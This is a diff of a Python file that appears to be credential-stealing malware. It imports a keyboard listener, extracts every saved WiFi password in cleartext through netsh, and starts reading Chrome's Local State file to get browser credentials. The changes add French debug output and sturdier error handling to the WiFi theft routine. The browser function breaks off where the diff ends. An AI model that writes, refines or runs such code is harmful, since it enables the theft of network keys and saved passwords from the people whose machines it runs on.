@@ -12,23 +12,33 @@ from pynput.keyboard import Listener
 
 def extract_wifi_creds():
     try:
-        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
+        print("Lancement de netsh wlan show profiles avec admin...")
+        profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, stderr=subprocess.STDOUT)
+        print("Sortie netsh profiles:", profiles_output)
         wifi_data = {}
+        current_profile = None
         for line in profiles_output.split('\n'):
-            if "All User Profile" in line:
-                profile_name = line.split(':')[1].strip()
+            line = line.strip()
+            if line.startswith("All User Profile"):
+                current_profile = line.split(':')[1].strip()
+                print(f"Profil detecte: {current_profile}")
                 try:
-                    details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + profile_name + '"', 'key=clear'], text=True)
+                    print(f"Essai d'extraction pour {current_profile}...")
+                    details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + current_profile + '"', 'key=clear'], text=True, stderr=subprocess.STDOUT)
+                    print("Sortie netsh details:", details)
                     for detail in details.split('\n'):
                         if "Key Content" in detail:
                             key_value = detail.split(':')[1].strip()
-                            wifi_data[profile_name] = key_value
-                except:
-                    pass
-        return wifi_data
-    except:
-        return {"error": "WiFi extraction failed"}
-
+                            if key_value:
+                                wifi_data[current_profile] = key_value
+                                print(f"Clé trouvee: {current_profile}: {key_value}")
+                except subprocess.CalledProcessError as e:
+                    print(f"Erreur pour {current_profile}: {e.output}")
+        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi trouve ou acces refuse (admin requis)"}
+    except subprocess.CalledProcessError as e:
+        return {"error": f"Commande netsh echouee: {e.output}"}
+    except Exception as e:
+        return {"error": f"Erreur inattendue: {e}"}
 def extract_browser_creds():
     try:
         local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
